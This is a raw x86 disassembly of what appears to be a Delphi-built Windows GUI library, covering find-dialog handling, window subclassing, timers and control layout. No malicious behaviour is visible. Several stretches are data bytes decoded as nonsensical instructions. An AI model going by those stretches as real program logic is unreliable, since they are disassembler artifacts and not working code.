push eax
call CallWindowProcA
xor eax eax
mov [ rw-data ] eax
sub_425058
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_41914c
mov [ esi + 0x30 ] 0x1
push esi
push sub_425134
call sub_41a1f0
mov [ esi + 0x40 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4250a0
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
call sub_41a288
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4250d4
xor ecx ecx
mov edx [ edx ]
cmp edx [ rw-data ]
jne r-xdata
mov eax ecx
retn
cmp [ eax + 0x38 ] 0x0
je r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov eax [ eax + 0x38 ]
xchg edx eax
call sub_458a00
mov cl 0x1
sub_4250fc
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edi [ ebx + 0x3c ]
test edi edi
je r-xdata
mov edx esi
mov eax ebx
call sub_403490
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
push edi
mov eax [ ebx + 0x34 ]
push eax
call CallWindowProcA
mov [ esi + 0xc ] eax
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_425134
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_42515e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4251cc
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x8 ] eax
call GetActiveWindow
mov [ ebp - 0x10 ] eax
xor eax eax
call sub_44f3f0
mov [ ebp - 0x14 ] eax
call sub_44f30c
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_42528f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4582f0
fnstcw [ ebp - 0x2 ]
xor eax eax
push ebp
push sub_425261
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
push esi
call ebx
mov [ ebp - 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425268
fnclex
fldcw [ ebp - 0x2 ]
mov eax [ ebp - 0x8 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x34 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45834c
retn
sub_425268
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425296
mov eax [ ebp - 0x14 ]
call sub_44f4a4
mov eax [ ebp - 0x10 ]
push eax
call SetActiveWindow
mov eax [ ebp - 0x18 ]
call sub_44f314
retn
sub_42539e
inc ebx
add [ edx + esi * 4 - 0x46d7ffbd ] dl
inc ebx
add al cl
mov [ ebx ] 0x24
push esp
inc edx
add [ eax - 0x1fffbc3d ] dh
rol [ ebx ] 0x60
mov [ ebx ] sub_43c764
sbb al 0xc6
inc ebx
add ah al
lds eax [ ebx ]
cmp al 0xf2
inc ebx
add [ eax + edx * 8 ] cl
inc ebx
add [ eax ] dh
add al 0x44
add [ eax - 0x57ffbc12 ] bh
int1
inc ebx
add [ ecx ] al
add [ ecx ] ah
mov al 0x84
push esp
inc edx
add [ ecx ] dl
push esp
push edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0xc08b776f
cld
push ebx
inc edx
add [ edi ] al
adc [ edx + edx * 2 + 0x65 ] edx
imul esi [ fs : edx + 0x65 ] 0x726f7463
push edi
imul ebp [ esi + 0x64 ] 0x5314776f
inc edx
add al al
dec esi
inc ebx
add [ ebx ] cl
add [ edi ] al
inc esp
imul esp [ ecx + 0x6c ] 0x73676f
add [ eax - 0xd74a9ad ] dl
mov ebx eax
mov edx esi
mov eax ebx
call sub_43c0b4
mov [ esi + 0x4 ] 0x90000000
mov eax [ ebx + 0x20c ]
mov [ esi + 0x1c ] eax
pop esi
pop ebx
retn
sub_425448
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_43cc3c
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0xb021
je r-xdata
cmp [ esi + 0x208 ] 0x0
je r-xdata
mov edx ebx
mov eax [ esi + 0x208 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
and eax 0x7f
mov [ ebx + 0xc ] eax
sub_42548c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x14 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
push eax
call GetPropA
push eax
call CallWindowProcA
pop ebp
retn
sub_4254c8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
sub eax 0x2
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45975c
cmp eax [ ebp + 0x8 ]
jne r-xdata
sub eax 0x80
je r-xdata
push ebp
call sub_42548c
pop ecx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_459780
jmp r-xdata
push ebp
call sub_42548c
pop ecx
mov ebx eax
movzx eax [ rw-data ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call RemovePropA
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax ebx
pop ebx
pop ebp
retn 0x10
cmp [ ebp + 0x10 ] 0x0
je r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45975c
cmp eax [ ebp + 0x8 ]
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45975c
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_459780
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
call sub_459780
jmp r-xdata
sub_42557c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x14 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
push edi
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
call sub_424ff0
cmp esi 0x110
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov esi [ edi + 0x1c ]
mov eax esi
call sub_42583c
inc eax
jne r-xdata
push 0x15
push 0x0
push 0x0
mov eax esi
call sub_425888
push eax
mov eax esi
call sub_42583c
push eax
push 0x0
push ebx
call SetWindowPos
mov eax esi
call sub_425888
inc eax
je r-xdata
push 0xfffffffc
push ebx
call GetWindowLongA
push eax
movzx eax [ rw-data ]
push eax
push ebx
call SetPropA
push sub_4254c8
push 0xfffffffc
push ebx
call SetWindowLongA
mov eax 0x1
sub_425604
push ebp
mov ebp esp
push ecx
push ebx
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_425058
mov ax [ r-xdata ]
mov [ ebx + 0x58 ] ax
mov [ ebx + 0x5a ] 0xffffffff
mov [ ebx + 0x5e ] 0xffffffff
lea eax [ ebx + 0x84 ]
mov [ eax ] 0x28
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x30 ]
mov [ eax + 0x4 ] edx
mov edx [ rw-data ]
mov [ eax + 0x8 ] edx
lea edx [ ebx + 0xac ]
mov [ eax + 0x10 ] edx
mov [ eax + 0x18 ] 0x100
lea edx [ ebx + 0x1ac ]
mov [ eax + 0x14 ] edx
mov [ eax + 0x1a ] 0x100
mov [ eax + 0x1c ] ebx
mov [ eax + 0x20 ] sub_42557c
mov eax FindTextA
mov [ ebx + 0x64 ] eax
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_4256ae
add [ eax ] al
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x80 ]
test eax eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
je r-xdata
push 0x0
push 0x0
push 0x10
push eax
call SendMessageA
lea eax [ esi + 0x68 ]
call sub_40cb64
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4250a0
test bl bl
jle r-xdata
xor edx edx
mov [ eax + 0x208 ] edx
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_425704
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0x8 ]
mov eax esi
call sub_435920
mov ebx eax
or edi 0xffffffff
test ebx ebx
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax ebx
mov edx [ r-xdata ]
call sub_4033e4
test al al
je r-xdata
mov eax [ ebp + 0xc ]
mov [ eax ] esi
xor edi edi
sub_425740
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x80 ]
test eax eax
je r-xdata
mov [ ebx + 0x90 ] 0x100
mov [ ebx + 0xa4 ] sub_42557c
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_43af54
mov esi eax
mov [ ebx + 0x68 ] esi
mov [ esi + 0x208 ] ebx
lea eax [ esi + 0x20c ]
push eax
push sub_425704
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ ebx + 0x68 ]
call sub_43f228
mov [ ebx + 0x88 ] eax
xor eax eax
mov esi rw-data
push eax
call BringWindowToTop
mov al 0x1
pop esi
pop ebx
retn
jae r-xdata
and edx 0x7f
bt [ ebx + 0x58 ] edx
inc eax
add esi 0x4
cmp al 0xd
jne r-xdata
mov edx [ esi ]
or [ ebx + 0x90 ] edx
mov edx eax
cmp dl 0xf
ja r-xdata
cmp [ ebx + 0x44 ] 0x0
je r-xdata
mov [ rw-data ] ebx
lea eax [ ebx + 0x84 ]
push eax
call [ ebx + 0x64 ]
mov esi eax
mov [ ebx + 0x80 ] esi
test esi esi
setne al
pop esi
pop ebx
retn
or [ ebx + 0x90 ] 0x200
mov eax [ ebx + 0x44 ]
mov [ ebx + 0xa8 ] eax
sub_425854
push ebx
add esp 0xfffffff0
mov ebx edx
mov edx [ eax + 0x5a ]
mov [ ebx ] edx
mov edx [ eax + 0x5e ]
mov [ ebx + 0x4 ] edx
mov edx [ eax + 0x80 ]
test edx edx
je r-xdata
add esp 0x10
pop ebx
retn
push esp
push edx
call GetWindowRect
mov eax [ esp ]
mov [ ebx ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x4 ] eax
sub_4258a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_4250d4
test al al
jne r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov edx [ ebx ]
cmp edx [ rw-data ]
jne r-xdata
mov edx [ ebx + 0x8 ]
lea ecx [ edi + 0x84 ]
cmp edx ecx
jne r-xdata
mov ax [ r-xdata ]
mov [ edi + 0x58 ] ax
xor ebx ebx
mov esi rw-data
inc ebx
add esi 0x4
cmp bl 0xd
jne r-xdata
mov eax ebx
cmp al 0xf
ja r-xdata
mov eax [ edi + 0x90 ]
and eax [ esi ]
je r-xdata
mov eax [ edi + 0x90 ]
test al 0x8
je r-xdata
and eax 0x7f
bts [ edi + 0x58 ] eax
test al 0x30
je r-xdata
mov eax edi
mov si 0xffed
call sub_403454
jmp r-xdata
test al 0x40
je r-xdata
mov eax edi
mov si 0xffec
call sub_403454
jmp r-xdata
mov al 0x1
push esp
mov eax [ edi + 0x80 ]
push eax
call GetWindowRect
mov eax [ esp ]
mov [ edi + 0x5a ] eax
mov eax [ esp + 0x4 ]
mov [ edi + 0x5e ] eax
xor eax eax
mov [ edi + 0x80 ] eax
push 0x0
push 0x0
push 0xb021
mov eax [ edi + 0x68 ]
call sub_43f228
push eax
call PostMessageA
xor eax eax
mov [ edi + 0x68 ] eax
sub_425998
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404450
mov edx eax
lea eax [ ebx + 0xac ]
mov ecx 0xff
call sub_4083a0
pop esi
pop ebx
retn
sub_425a60
add esp 0xffffffd0
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push r-xdata
call RegisterWindowMessageA
mov [ rw-data ] eax
push 0x1
mov eax [ rw-data ]
mov [ esp + 0x24 ] eax
mov [ esp + 0x28 ] 0x0
call GetCurrentThreadId
mov [ esp + 0x2c ] eax
mov [ esp + 0x30 ] 0x0
lea ecx [ esp + 0x24 ]
mov edx r-xdata
lea eax [ esp + 0x4 ]
call sub_408984
push eax
call GlobalAddAtomA
mov [ rw-data ] ax
add esp 0x30
retn
sub_425afb
add [ edi ] cl
add [ eax ] al
add ah al
ja r-xdata
ja r-xdata
add [ edi + edi * 2 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add al al
ja r-xdata
ja r-xdata
add al dl
add [ esi ] 0x0
test al 0x77
inc esi
ja r-xdata
add [ eax ] al
add [ edi + esi * 2 - 0x7effffba ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x68004677 ] ah
add [ esi ] 0x0
add [ eax ] al
add [ edi + esi * 2 - 0x7d53ffba ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] ch
inc esi
add [ edi + edi * 2 + 0x46 ] bl
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x46 ] ah
add [ ecx + eax * 4 ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x7efc0046 ] bh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004677 ] bh
add [ esi ] 0x0
add [ eax ] al
add [ edi + esi * 2 - 0x7eb7ffba ] dh
inc esi
add [ eax ] al
add [ eax ] al
add [ eax - 0x13ffb989 ] dh
add [ esi ] 0x0
add [ eax ] al
add [ edi + esi * 2 - 0x7e2fffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x44004677 ] ch
add [ esi ] 0x0
and al 0x77
inc esi
add [ eax - 0x18 ] dl
pop ebp
add al 0xfe
add [ edx + eax * 4 ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ eax + 0x77 ] ah
inc esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_425c0d
retn
cmp [ rw-data ] 0x0
je r-xdata
ja r-xdata
add [ eax + eax * 4 + 0x46 ] al
add [ eax ] al
mov eax rw-data
mov ecx 0xb
mov ax [ rw-data ]
push eax
call GlobalDeleteAtom
ja r-xdata
add [ eax - 0x7e ] bl
inc esi
add [ eax ] al
add [ eax ] al
add [ edi + esi * 2 + 0x46 ] bl
add [ eax + 0x4680 ] ch
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_425c06
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
call sub_412fe8
mov eax [ r-xdata ]
call sub_413088
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_413034
retn
mov edx [ r-xdata ]
call sub_404a0c
add [ ecx + 0xb ] bh
sub_426a65
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
popad
dec ebp
outsd
jbe r-xdata
cwde
je r-xdata
dec edi
movsb [ edi ] [ esi ]
cmp al 0x43
add al ah
add [ eax ] al
jmp eax
add [ eax - 0x3 ] dh
inc ebx
add [ esp + edi * 8 + 0x7d840043 ] bh
add [ esp + esi - 0x6defffc0 ] dl
outsd
outsb
add [ eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add ah dh
push 0x42
add [ edi ] al
insb
jo r-xdata
inc ecx
add [ eax ] al
mov al [ 0x426c ]
jb r-xdata
add [ eax ] al
je r-xdata
bound ebp [ edi + 0x76 ]
pop es
insb
jo r-xdata
add [ edx + eax ] ch
add [ eax ] al
movsb [ edi ] [ esi ]
mov [ 0xffffffff98d00042 ] al
inc esp
jb r-xdata
inc ebx
add al dl
inc ebx
add al dh
inc ebx
add [ eax ] cl
add [ eax + 0x2c00426c ] cl
add al [ eax ]
add [ edx - 0x672fffbe ] ah
inc edx
insb
outsd
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebp * 2 + 0x42 ] dh
add [ eax ] al
nop
clc
push 0x42
add [ ebx ] al
push cs
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
push eax
outsd
jae r-xdata
pop es
insb
jo r-xdata
inc eax
add [ eax - 0x50 ] bh
inc ebx
add [ eax - 0x3 ] al
inc ebx
add [ eax - 0x3b ] ch
inc ebx
add [ eax + 0x3d ] dl
inc ecx
add ah bh
stosb [ edi ]
inc ebx
add [ edx + eax * 4 + 0x42 ] dh
add [ edx + esi * 4 ] bl
inc ebx
add ah ch
add [ edx ] 0xffffffe8
cwde
inc ecx
add [ ebp + edx * 4 - 0x6a4bffbf ] bh
inc ecx
add al dh
cwde
inc eax
add [ edx + esi ] cl
imul esp [ edi + 0x68 ] 0x78450874
inc ecx
add [ esp + esi - 0x220bffc0 ] bl
inc edx
add al dh
xor [ eax ] eax
or al 0x32
xchg edx eax
je r-xdata
hlt
je r-xdata
je r-xdata
or [ ebp + 0x78 ] al
insb
jo r-xdata
inc ecx
add ah cl
add [ edx ] sub_43f854
jo r-xdata
xchg ebp eax
inc ecx
add [ ebp + edx * 4 - 0x670fffbf ] dh
insb
jae r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx - 0x10 ] bp
inc ebx
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0027 ] al
inc eax
add [ ebx + ebp * 2 + 0x42 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sub_427694
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov [ esi + 0x40 ] 0x0
mov eax esi
call sub_427740
mov eax [ esi + 0x34 ]
call sub_41a360
mov edx ebx
and dl 0xfc
mov eax esi
call sub_419198
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_4276cc
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov esi [ ebx ]
cmp esi 0x113
jne r-xdata
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x34 ]
push eax
call DefWindowProcA
mov [ ebx + 0xc ] eax
xor eax eax
push ebp
push sub_427706
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_403454
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427740
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov ebx eax
xor eax eax
push ebp
push sub_4277bf
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call KillTimer
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4277c6
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x3a ] 0x0
je r-xdata
push 0x0
push esi
push 0x1
mov eax [ ebx + 0x34 ]
push eax
call SetTimer
test eax eax
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a90
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b284
call sub_4039cc
sub_427980
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4304b8
mov edx edi
mov eax [ esi + 0x210 ]
call sub_413650
xor edx edx
mov eax edi
call sub_438960
mov eax esi
mov edx [ eax ]
call [ edx + 0x50 ]
mov edx eax
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x64 ]
xor edx edx
mov eax edi
call sub_438bb4
mov [ edi + 0x124 ] esi
mov [ edi + 0x120 ] sub_427db0
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_427a04
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
mov eax [ eax + 0x210 ]
mov edx esi
call sub_4138f0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43b078
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_427a3c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_427aa1
push [ fs : eax ]
mov [ fs : eax ] esp
mov si [ ebx + 0x6 ]
test si si
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
je r-xdata
cmp si 0x5
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4307b8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
sub_427aa6
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_458560
call sub_403a48
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_427acc
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx ebx
mov eax edi
call sub_43e20c
mov edx ebx
mov eax [ edi + 0x30 ]
mov si 0xffba
call sub_403454
cmp [ ebx ] 0x8
je r-xdata
mov eax [ edi + 0x30 ]
mov edx [ eax ]
call [ edx + 0xcc ]
test al al
jne r-xdata
cmp [ ebx ] 0x20
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov [ ebx ] 0x0
sub_427b0c
push ebx
push esi
push ecx
mov [ esp ] cl
mov esi edx
mov ebx eax
mov edx esi
mov cl [ esp ]
mov eax ebx
call sub_43e054
mov edx esi
mov cl [ esp ]
mov eax [ ebx + 0x30 ]
mov si 0xffbc
call sub_403454
pop edx
pop esi
pop ebx
retn
sub_427b38
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_42ca88
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebx + 0x210 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov esi eax
mov [ ebx + 0x214 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_427de8
mov [ ebx + 0x218 ] 0xffffffff
mov [ ebx + 0x21c ] 0x1
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_427bc8
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_427e5c
mov eax [ esi + 0x214 ]
xor edx edx
mov [ eax + 0x20 ] edx
mov [ eax + 0x24 ] edx
call sub_403258
mov eax [ esi + 0x210 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_440f08
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_427c18
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x210 ]
cmp [ eax + 0x8 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
push 0x0
call GetDC
mov esi eax
mov eax [ ebx + 0x68 ]
call sub_41c1f8
push eax
push esi
call SelectObject
mov edi eax
lea eax [ ebp - 0x58 ]
push eax
push esi
call GetTextMetricsA
push edi
push esi
call SelectObject
push esi
push 0x0
call ReleaseDC
mov eax [ ebx + 0x210 ]
mov esi [ eax + 0x8 ]
mov eax esi
mov ecx [ ebx + 0x21c ]
add eax ecx
dec eax
cdq
idiv ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x48 ]
sub eax 0xa
cdq
idiv ecx
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x4c ]
mov ecx [ ebp - 0x58 ]
sub eax ecx
sub eax 0x5
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
sar edx 0x1
jns r-xdata
inc ecx
add edx ecx
mov [ ebp - 0x10 ] edx
push esi
call BeginDeferWindowPos
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_427da1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x210 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
adc edx 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
push eax
call EndDeferWindowPos
retn
inc eax
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x14 ] 0x0
push 0x14
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul edx [ ebp - 0xc ]
add edx [ ebp - 0x10 ]
push edx
mov eax [ ebp - 0x1c ]
push eax
push 0x0
mov eax edi
call sub_43f228
push eax
mov eax [ ebp - 0x18 ]
push eax
call DeferWindowPos
mov [ ebp - 0x18 ] eax
mov dl 0x1
mov eax edi
call sub_438960
inc [ ebp - 0x14 ]
dec [ ebp - 0x20 ]
jne r-xdata
mov eax ebx
call sub_438444
sub eax [ ebp - 0x1c ]
sub eax [ ebp - 0x8 ]
mov [ ebp - 0x1c ] eax
mov eax [ ebx + 0x210 ]
mov edx [ ebp - 0x14 ]
call sub_4137ac
mov edi eax
mov dl [ ebx + 0x5f ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x14 ]
cdq
idiv [ ebp - 0x4 ]
imul [ ebp - 0x8 ]
add eax 0x8
mov [ ebp - 0x1c ] eax
mov eax edi
mov si 0xffc8
call sub_403454
test al al
je r-xdata
sub_427db0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x221 ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x210 ]
call sub_413808
mov [ ebx + 0x218 ] eax
mov eax ebx
call sub_43864c
mov eax ebx
mov si 0xffeb
call sub_403454
sub_427de8
push ebx
mov ebx eax
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
cmp eax [ ebx + 0x218 ]
jg r-xdata
mov eax ebx
call sub_427f60
mov eax [ ebx + 0x214 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
mov [ ebx + 0x218 ] eax
sub_427e5c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x210 ]
cmp esi [ eax + 0x8 ]
jg r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427980
jmp r-xdata
mov edi [ ebx + 0x210 ]
cmp esi [ edi + 0x8 ]
jl r-xdata
mov eax edi
call sub_413894
call sub_403258
pop edi
pop esi
pop ebx
retn
sub_427e9c
push ebx
mov ebx eax
cmp edx 0x1
jge r-xdata
cmp edx 0x10
jle r-xdata
mov edx 0x1
cmp edx [ ebx + 0x21c ]
je r-xdata
mov edx 0x10
pop ebx
retn
mov [ ebx + 0x21c ] edx
mov eax ebx
call sub_427c18
mov eax ebx
mov edx [ eax ]
